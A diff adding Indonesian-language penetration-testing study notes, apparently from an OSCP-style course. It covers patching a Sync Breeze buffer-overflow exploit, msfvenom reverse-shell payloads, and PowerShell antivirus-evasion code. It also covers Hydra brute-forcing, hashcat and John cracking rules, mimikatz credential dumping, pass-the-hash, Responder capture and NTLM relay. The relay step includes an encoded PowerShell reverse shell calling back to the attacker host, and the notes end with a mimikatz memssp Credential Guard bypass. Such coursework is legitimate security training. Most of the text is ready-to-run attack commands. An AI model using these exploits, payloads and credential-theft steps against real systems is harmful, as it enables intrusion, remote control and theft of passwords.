@@ -1606,3 +1606,666 @@ kemudain extract menggunakan impacket-secretdump
 ```
 impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
 ```
+
+##### Fixing exploit
+Jadi disini kita akan belajar cara mempelajari untuk mempatching suatu public exploit. kebetulan disini ada semacam kerentanan buffer overflow pada software Sync Breeze Enterprise 10.0.28
+
+```
+searchsploit "Sync Breeze Enterprise 10.0.28"
+
+//output: 
+Sync Breeze Enterprise 10.0.28 - Remote Buffer Overflow (PoC) | windows/dos/42341.c
+
+
+//kita bisa copy dengan :
+searchsploit -m windows/dos/42341.c
+```
+
+karena format C, maka kita perlu melakukan cross compile menjadi executable menggunakan mingw
+
+```
+i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe
+
+output:
+/usr/bin/i686-w64-mingw32-ld: /tmp/cchs0xza.o:42341.c:(.text+0x97): undefined reference to `_imp__WSAStartup@8'
+```
+
+Terdapat kesalahan karena undefined WAStartup yang berarti linker tidak menemukan library winsock dan tinggal tambahkan opsi -lws2_32
+
+```
+i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
+```
+
+Beberapa hal perlu diubah agar exploit bekerja, sepert host, port dan beberapa hardcode lainnya. terutama pada bagian 
+
+```
+unsigned char retn[] = "\x83\x0c\x09\x10";
+```
+yang merupakan intruksi JMP ESP, intruksi ini berperan untuk melakukan jump ke register ESP yang jika kita timpa dengan address shellcode(awal stack sesuai dengan alamat ESP), maka program akan melakukan eksekusi pada shellcode kita alih alih berjalan normal.
+
+generate menggunakan msfvenom dengan encode shikata_ga_nai dan menghapus bad char
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.237 LPORT=443 EXIFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
+```
+
+Setelah itu lanjut set breakpoint pada intruksi JMP ESP di 0x10090c83, dan jika kita run dengan 
+
+```
+sudo wine syncbreeze_exploit.exe
+```
+hasilnya breakpoint tidak pernah berhenti, ini berarti ada kesalah offset pada payload kita yang pada intruksi EIP akan melompat ke 0x9010090c, dan tampaknya offset kita kurang 1 byte ini karena fungsi seperti strcat akan mengatur karakter terakhit ke null byte yang pada akhirnya panjang payload kita ada 779.
+
+yang perlu kita ubah yaitu dengan menambahkan 1 byte
+
+```
+    int initial_buffer_size = 781;
+```
+
+dan selanjutnya jika dieksekusi, maka payload akan bekerja
+
+#### learn day 17
+
+
+Jadi di module ini terkait dengan antivirus evasion, dan untuk prakteknya kita akan memakai beberapa pendekatan seperti melakukan bypass dengan powershell reflection maupun automation dengan shelter.
+
+Contoh pertama kita akan menggunakan powershell, jadi kita bisa melakukan generate function powershell dengan msfvenom
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f psh-reflection
+```
+
+dan kemudian kita buat menggunakan serangkaian windows API
+
+```
+$code = '
+[DllImport("kernel32.dll")]
+public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+[DllImport("kernel32.dll")]
+public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+[DllImport("msvcrt.dll")]
+public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
+
+function xf {
+        Param ($nfCl, $vf)
+        $uaQP = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+
+        return $uaQP.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($uaQP.GetMethod('GetModuleHandle')).Invoke($null, @($nfCl)))), $vf))
+}
+
+function xb {
+        Param (
+                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $jGN_b,
+                [Parameter(Position = 1)] [Type] $hh = [Void]
+        )
+```
+
+Dan jika denied, kita bisa set policy saat ini :
+
+```
+Get-ExecutionPolicy -Scope CurrentUser
+
+//set policy
+Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
+
+//set to unristrected 
+Get-ExecutionPolicy -Scope CurrentUser
+
+//lalu jalankan 
+.\bypass.ps1
+```
+
+
+##### Automation processs
+Disini kita juga bisa menggunakan shelter untuk melakukan automation.
+
+
+install dan use
+```
+sudo apt install shellter
+
+sudo apt install wine
+sudo dpkg --add-architecture i386 && apt-get update &&
+apt-get install wine32
+```
+
+
+#### Password attack
+
+Disini kita akan belajar terkait password attack, jadi tekniknya cukup umum seperti dengan melakukan brute force service maupun crack hash.
+
+
+Contoh serangan ssh menggunakan hydra
+
+```
+hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.107.201
+
+//using list
+hydra -L user.txt -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.107.201
+
+//huruf besar untuk list dan kecil untuk word
+```
+
+
+#### RDP 
+
+Kita akan belajar terkait password spraying disini. jadi ada banyak cara untuk mendapatkan suatu password, bahkan banyak service / platform untuk melakukan checking password yang bocor dan mendapatkannya seperti pada https://scatteredsecrets.com/
+
+Spray password berarti, kita menggunakan satu set password yang sama dari kumpulan username, contohnya : 
+
+```
+hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
+```
+
+
+#### HTTP
+
+Saat melakukan pentest, kita akan banyak berhadapan dengan website / http, jadi kita bisa memanfaatkan form data dan melakukan brute force.
+
+contoh command : 
+```
+hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
+
+
+//https 
+hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 https-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
+```
+
+Contoh diatas kita menggunakan username "user" dan password yang diambil dari rockyou.txt, lalu pada bagian terakhir :, merupakan acuan saat kata sandi salah yang berarti kita bisa menyesuaikan hal tsb
+
+#### Learn day 18
+
+Masih di module password attack, jadi kita akan mempelajari lebih dalam lagi tentang teori maupun prakteknya.
+
+disini kita belajar mengenali perbedaan dari encryption, hash dan cracking. kita bahas dasar enkripsi, dan enkripsi merupakan fungsi 2 arah yang bisa dilakukan pengacakan dan penyusunan ulang menggunakan setidaknya 1 kunci. Daya yang di enkripsi disebut cipher text.
+
+2 jenis enkripsi yaitu :
+- asymetric : menggunakan kunci private / public
+- symetric : menggunakan 1 kunci
+
+Disisi lain ada hash / digest yang merupakan output dari suatu plaintext yang diolah melalui serangkaian algoritma(md5, sha1, bcrypt dll) dengan hasil nilai hexa dengan panjang tetap/static.
+
+contoh hash dengan sha256 :
+
+```
+echo -n "secret" | sha256sum
+
+
+//output hash berbeda jika string yang di input berbeda
+echo -n "secret1" | sha256sum
+```
+
+2 tools powerfull untuk melakukan cracking kita bisa menggunakan john the ripper dan hashcat, tapi sebelum kita melakukan cracking, kita perlu kalkulasi waktu cracking dari representasi hashnya. Sebagai contoh, jika kita menggunakan password dengan kemungkinan alfabet huruf besar dan kecil yang berarti 26 x 2 + angka 0 - 9 berarti 62
+
+dimana 62 ini dipangkatkan dengan kemungkinan length password. yang berarti :
+
+```
+echo -n "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" | wc -c
+
+python3 -c "print(62**5)"
+//output: 916132832
+```
+
+untuk 5 character sendiri kita memiliki keyspace 916132832, setelah itu kita membutuhkan hashrate(ukuran perhitungan hash dalam 1 detik) untuk menghitung waktu cracking.
+
+menggunakan hashcat dengan opsi -b
+
+```
+hashcat -b
+```
+
+comman ini merupakan benchmarking untuk menampilkan speed hash pada hashcat dengan contoh md5 
+
+```
+-------------------
+* Hash-Mode 0 (MD5)
+-------------------
+
+Speed.#1.........: 47815.2 kH/s (17.04ms) @ Accel:256 Loops:1024 Thr:1 Vec:8
+
+```
+speed ditunjukkan pada hH/s atau MH/s dimana MH/s sama dengan 1.000.000 hash per detik, jadi perhitungannya adalah keyspace / hashrate
+
+misalkan : 
+
+```
+
+python3 -c "print(916132832 / 134200000)"
+//output: 6.826623189269746
+
+python3 -c "print(916132832 / 9276300000)"
+//output:  0.09876058687192092
+```
+
+Disini output 1, menunjukkan hash bisa dipecahkan dalam waktu sekitar 7 detik dan output 2 menunjukkan hash pecah dalam waktu kurang dari 1 detik
+
+
+
+#### Mutating wordlist
+
+rule-based attack, dimana attacker memodifikasi wordlist sesuai dengan aturan yang ditentukan. Terkadang beberapa platform / layanan seringkali menerapkan password policy jadi pengguna diharuskan menggunakan password dari serangkaian character huruf besar maupun angka.
+
+Menggunakan hashcat, kita bisa menambahkan rule kita sendiri
+
+```
+echo \$1 > demo.rule
+```
+
+Disini kita menambahkan character 1 pada akhir password
+
+```
+hashcat -r demo.rule --stdout pass.txt 
+
+//output: 
+password1
+iloveyou1
+princess1
+rockyou1
+abc1231
+```
+
+Kita juga bisa agar password, pada awal character menggunakan kapital menggunakan rule 'c'
+
+```
+cat demo1.rule                                                
+
+//output:
+$1 c
+
+hashcat -r demo1.rule --stdout pass.txt
+
+//output:
+Password1
+Iloveyou1
+Princess1
+Rockyou1
+Abc1231
+```
+
+dan bisa juga menambahkan special character seperti !, contoh
+
+```
+cat demo1.rule
+
+//output : $1 c $!
+
+hashcat -r demo1.rule --stdout demo.txt
+Password1!
+Iloveyou1!
+Princess1!
+Rockyou1!
+Abc1231!
+```
+Kita juga bisa membuat lebih dari 1 line rule seperti :
+
+```
+$1 c $!
+$2 c $!
+$1 $2 $3 c $!
+```
+
+artinya kita membuat 3 rule dan password kita akan dilakukan permutation. 
+
+setelah itu execute 
+
+```
+hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force
+```
+
+atau kita juga bisa menggunakan rule khusus yang disediakan hashcat pada file 
+
+```
+ls -la /usr/share/hashcat/rules/
+```
+
+
+selanjutnya, sebelum melakukan cracking kita perlu mengerti dulu jenis hash yang digunakan
+
+```
+//menggunakan hashid
+hashid '$2y$10$XrrpX8RD6IFvBwtzPuTlcOqJ8kO2px2xsh17f60GZsBKLeszsQTBC'
+
+//menggunakan hash-identifier
+hash-identifier '4a41e0fdfb57173f8156f58e49628968a8ba782d0cd251c6f3e2426cb36ced3b647bf83057dabeaffe1475d16e7f62b7'
+```
+
+
+##### Password manager
+Selanjutnya kita akan belajar terkait password manager, umumnya di windows sendiri file credential password manager menggunakan ekstensi kdbx
+
+contoh untuk mencari rekursif
+
+```
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+```
+
+Lalu jika ditemukan, pindah pada machine kali kita dan selanjutkan kita perlu melakukan konversi ke hash yang dapat dibaca menggunakan ssh2john atau keepass2john
+
+```
+keepass2john Database.kdbx > keepass.hash
+
+cat keepass.hash                                              
+//output
+Database:$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1
+
+//remove string "Database"
+$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1
+```
+
+selanjutnya cari type pada hashcat 
+
+```
+hashcat --help | grep -i "KeePass"
+```
+
+selanjutnya lakukan execute 
+
+```
+hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
+
+//rule bisa diubah sesuai kebutuhan
+```
+
+
+#### passphrase private key SSH
+
+pada banyak kasus, private key ssh ditambahkan passphrase jadi untuk menggunakannya kita perlu mengerti passphrase yang digunakan
+
+contohnya seperti ini 
+
+```
+ssh -i id_rsa dave@192.168.174.201 -p 2222
+The authenticity of host '[192.168.174.201]:2222 ([192.168.174.201]:2222)' can't be established.
+ED25519 key fingerprint is SHA256:SxEapuin3GJsdhOqDdFrm+ncv8/8UU+a8npW7OKfREk.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[192.168.174.201]:2222' (ED25519) to the list of known hosts.
+Enter passphrase for key 'id_rsa': 
+```
+
+yang dimana key meminta input passphrase dan disini kita bisa menggunakan john untuk melakukan ekstraksi hash
+
+```
+ssh2john id_rsa > ssh.hash
+```
+
+file disimpan pada ssh.hash, sekarang lanjut analisis file note.txt yang kita temukan diserver 
+
+```
+Dave's password list:
+
+Window
+rickc137
+dave
+superdave
+megadave
+umbrella
+
+Note to myself:
+New password policy starting in January 2022. Passwords need 3 numbers, a capital letter and a special character
+```
+Password policy bisa kita buat sendiri berdasarkan file notes.txt dengan klasifikasi berikut:
+- ada tambahan angka 137
+- password  Window dimulai menggunakan upper case
+- dan ada catatan special char jadi kita akan menggunakan (!, @, #)
+
+jadi rulesnya seperti berikut: 
+
+```
+c $1 $3 $7 $!
+c $1 $3 $7 $@
+c $1 $3 $7 $#
+```
+
+jika kita menggunakan hashcat seperti 
+```
+hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
+```
+
+maka akan terdapat kesalahan, intinya hashcat mode 22921 tidak support pada hash ssh kita jadi kita akan menggunakan john the ripper untuk ini
+
+kita buat rules untuk john the ripper
+
+```
+[List.Rules:sshRules]
+c $1 $3 $7 $!
+c $1 $3 $7 $@
+c $1 $3 $7 $#
+```
+
+selanjutnya, kita akan menginputkan di file /etc/john/john.conf agar rule bisa kita load
+
+```
+sudo sh -c 'cat /home/kali/oscp/password-cracking/ssh.rules >> /etc/john/john.conf'
+
+//run 
+john --wordlist=ssh-pass.txt --rules=sshRules ssh.hash
+```
+
+setelah itu login ssh dan masukan passphrase
+
+```
+ssh -i id_rsa dave@192.168.174.201 -p 2222
+```
+
+
+
+##### Working with password hash
+
+pada unit ini kita akan belajar bagaimana mendapatkan hash dan menggunakan hash untuk mendapatkan akses ke system lain pada operating system windows.
+
+Windows menyimpan password dan credential pada file SAM(Security Account Manager) yang digunakan untuk authentikasi user local dan remote. NTLM juga disimpan pada database SAM
+
+SALT merupakan bit random yang ditambahkan pada password sebelum di hash. jadi di unit ini kita akan menggunakan mimikatz untuk melakukan ekstraksi hash. mimikatz melakukan ekstraksi dari berbagai sumber windows, salah satunya LSASS yang merupakan process untuk menghandle authentikasi user, password update dan pembuatan token akses . Penggunaan mimikatz harus dijalankan pada user administrator atau privilege tinggi.
+
+command untuk dump SAM
+```
+.\mimikatz.exe
+
+//mode debug dan cek privilege 
+privilege::debug
+
+//untuk meningkatkan ke privilge system
+token::elevate
+
+//lanjut dump sam
+lsadump::sam
+```
+
+selanjutnya cek hash mode pada hashcat untuk lanjut cracking
+
+```
+hashcat --help | grep -i "ntlm"
+
+//output di 1000
+```
+
+lalu lakukan cracking 
+```
+hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+
+#### Pass the Hash
+
+Selanjutnya kita akan menggunakan pass the hash. jadi tanpa password plain-text, kita bisa melakukan auth hanya dengan hash NTLM. 
+
+Beberapa tools dan command yang digunakan untuk melakukan pass-the-hash attack
+
+```
+smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
+
+impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
+
+impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
+```
+
+perbedaan besarnya pada psexec dan wmiexec yaitu jika pada psexec kita akan selalu mendapatkan shell interaktif sebagai system, tapi pada wmiexec kita mendapatkan shell sebagai user yang sesuai pada saat authentikasi.
+
+
+#### NTLMv2
+pada banyak kasus, kita tidak bisa melakukan ekstraksi hash dan menjalankan mimikatz karena bukan privilege tinggi. Alternatifnya, kita bisa memanfaatkan protokol network authentication(_Net-NTLMv2_) 
+
+dasar proses authentikasi client dan server melalui Net-NTLMv2:
+- client mengirimkan request ke server untuk akses SMB
+- server meresponse "challenge" ke client
+- client melakukan enkripsi data dengan hash NTLM
+- server validasi response challenge apakah diizinkan atau ditolak
+
+Disini kita bisa menyalahgunakan dengan meniru service yang sesuai dan meminta server untuk melakukan authentikasi menggunakan protocol NTLM, yang kemudian kita bisa menangkap hashnya.
+
+Disini kita akan menggunakan responder, dengan skenario berikut
+
+kita punya akses reverse shell pada user paul pada privilege rendah, tapi paul ini masuk ke group remote desktop user. jadi untuk mendapatkan NTLM hashnya kita perlu setup service tiruan kita pada host local menggunakan responder
+
+```
+
+//interface disesuakan
+sudo responder -I tun0
+
+//pada shell paul dan IP disesuakan
+C:\Windows\system32>dir \\192.168.45.161\test
+```
+
+Cek output responder, seharusnya NTLM berhasil di capture lalu lanjut cracking hashcat
+```
+//cek mode
+hashcat -hh | grep -i "ntlm"
+
+//cracking
+hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
+```
+
+##### Relai NTLM
+
+sebagian besar kasus, hash NTLM tidak bisa dilakukan cracking dan jika skenarionya seperti itu kita bisa juga mencoba memanfaatkan serangangan relay NTLM. Jadi cara kerjanya seperti ini :
+
+- attacker setup relay NTLM
+- attacker menjalankan auth NTLM(dir \\ip\test)
+- alih alih hanya meresponse hash, request akan diteruskan ke service lain
+- jika authentikasi berasal dari admin, kita juga bisa melakukan command pada psexec dan wmiexec
+
+
+jadi disini kita akan menggunakan ntlmrelayx pada module impacket dan melakukan eksekusi reverse shell.
+
+pertama kita generate payload revshellnya
+
+```
+python3 generate-revshell.py 192.168.45.161192.168.45.161 443
+```
+
+lalu jalankan ntlmrelayx dengan opsi -t IP yang merupakan host2 atau dengan kata lain request kita akan di forward ke IP 192.168.174.211
+```
+impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.174.211 -c "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANgAxACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
+```
+
+selanjutnya jalankan revshell pada port 443
+
+```
+nc -lnvp 443
+```
+
+lalu pada host 1, komunikasikan dengan host kita yang sudah running ntlmrelayx
+
+```
+dir \\192.168.45.161\test
+```
+seharusnya, listener kita menerima koneksi shell pada host2
+
+
+
+##### Windows credential guard
+
+kita diatas belajar terkait hash pada akun local. namun pada saat melakukan penetration testing, kita akan menemukan jenis akun lain misalkan akun user dalam domain. Jika pada local semua informasi akun disimpan pada SAM sementara pada domain, informasi akun disimpan dalam proses lsass.exe.
+
+Mimikatz bisa melakukan dump hash dari user domain, dengan syarat pengguna domain pernah masuk pada host yang akan kita jalankan mimikatz, sebagai contoh kita akan masuk sebagai administrator pada host client26
+
+```
+xfreerdp3 /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.174.248 /sec:nla /dynamic-resolution
+```
+
+setelah itu logout dan ganti user offsec(admin local)
+
+```
+xfreerdp3 /u:offsec /p:lab /v:192.168.174.246 /sec:nla /dynamic-resolution
+```
+Karena sebelumnya administrator sudah login pada client26, selanjutnya kita jalankan mimikatz untuk melakukan dump
+
+```
+C:\tools\mimikatz\mimikatz.exe
+
+privilege::debug
+sekurlsa::logonpasswords
+```
+
+Seharusnya bagian output menunjukkan NTLM dari administrator beserta informasi logon server.
+
+dan kita bisa menggunakan wmiexec untuk terhubung ke server
+
+```
+impacket-wmiexec -debug -hashes 00000000000000000000000000000000:160c0b16dd0ee77e7c494e38252f7ddf CORP/Administrator@192.168.174.248
+```
+
+Teknik ini sebenarnya sudah dilakukan mitigasi oleh microsoft, yaitu dengan menerapkan Virtualization-Based Security/VBS yang merupakan teknologi virtualisasi hardware yang disediakan oleh CPU dengan fitur untuk melakukan isolasi wilayah memory.
+
+VBS menjalankan hypervisor pada hardware bukan pada operating system dan di implementasikan melalui hyper-v(hypervisor asli microsoft) dan selain itu, microsoft juga mengembangkan VSM(Virtual Secure Mode) yang merupakan kemampuan pada partisi hyper-v
+
+VSM menciptakan area terisolasi di memory yang menyimpan info sensitive, dan area ini hanya dapat diakses melalui hypervisor yang berjalan pada hak akses sangat tinggi daripada kernel. Artinya meskipun privilege kita nt system, tetap saja kita tidak bisa mengakses area tersebut
+
+VSM membagi isolasi melalui beberapa level VTL(Virtual Trust Level), dan tiap vtl memiliki tiap bagian area memory dan saat ini mempunyai 16 level VTL-1 sampai VTL-16
+
+Di module ini kita akan fokus pada mitigasi credential guard. saat diaktifkan, LSASS berjalan sebagai trustlet di VTL1 dengan nama LSAISO.exe(LSA ISOLATED) yang berkomunikasi dengan LSASS pada VTL0 melalui RCP.
+
+mimikatz menelususri lsass.exe untuk dumping semua informasi credential, tapi saat credential guard aktif semua process baru disimpan pada VTL-1 bukan lsass.exe, artinya kita tidak bisa melakukan dump karena terisolasi 
+
+untuk identifikasi, kita bisa menggunakan command : 
+
+```
+Get-ComputerInfo
+```
+Apakah terdapat string seperti 
+
+```
+DeviceGuardSecurityServicesConfigured: {CredentialGuard, HypervisorEnforcedCodeIntegrity, 3}
+DeviceGuardSecurityServicesRunning : {CredentialGuard, HypervisorEnforcedCodeIntegrity}
+```
+
+Jika ada, berarti target sudah menerapkan credential guard dan jika kita running mimikatz maka kita tidak akan melihat hash yang dicache. Tapi pentingnya, credential guard hanya melindungi user non-local jadi kita masih bisa melakukan dump pada user local.
+
+Jadi cara satu satunya bukan melakukan dump, tapi melakukan intercept user yang login ke server, yaitu dengan memanfaatkan mekanisme auth SSPI(Security Support Provider Interface) dan secara default, windows menyediakan SSP seperti kerberos security support provider dan ntlm security support provider dan SSP diintegrasikan ke dalam SSPI sebagai DLL.
+
+Jika kita mengembangkan SSP sendiri dan register ke LSASS, kemungkinan bisa memaksa SSPI untuk menggunakan DLL security support provider berbahaya kita untuk auth.
+
+untungya mimikatz menyediakan hal ini melalui memssp, jadi kita bisa intercept plain-text user yang login.
+
+pada user offsec :
+
+```
+privilege::debug
+
+//untuk melakukan inject SSP
+misc::memssp
+```
+
+Jadi kita hanya perlu menunggu seseorang melakukan authentikasi, anggaplah case kali ini administrator melakukan koneksi RDP
+```
+xfreerdp /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.50.245 /dynamic-resolution
+```
+
+Setelah itu, kredensial akan disimpan di file log
+
+```
+C:\Windows\System32\mimilsa.log
+
+//read 
+type C:\Windows\System32\mimilsa.log
+
+//output:
+Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
+[00000000:00af2311] CORP\Administrator  QWERTY123!@#
+[00000000:00404e84] CORP\Administrator  Šd
+[00000000:00b16d69] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ 
+```
+
+Disini kita berhasil mendapatkan password administrator melalui memssp pada mimikatz
